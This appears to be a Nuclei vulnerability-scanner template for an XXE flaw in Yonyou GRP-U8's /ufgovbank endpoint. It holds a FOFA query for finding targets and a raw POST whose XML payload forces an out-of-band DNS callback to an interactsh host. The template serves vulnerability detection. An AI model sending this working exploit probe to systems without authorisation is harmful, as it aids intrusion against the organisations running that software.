id: poc-yaml-grp-u8-ufgovbank-xxe
info:
  name: 用友GRP-U8 ufgovbank XML实体注入漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: dnslog,xxe
  metadata:
    finger: GRP-U8
    fofa: body="GRP-U8"

variables:
  reverse: '{{interactsh-url}}'

http:
  - raw:
      - |
        POST /ufgovbank HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        reqData=<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://{{reverse}}">&signData=1&userIP=1&srcFlag=1&QYJM=0&QYNC=adaptertest
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_request
        words:
          - "<!DOCTYPE foo SYSTEM"
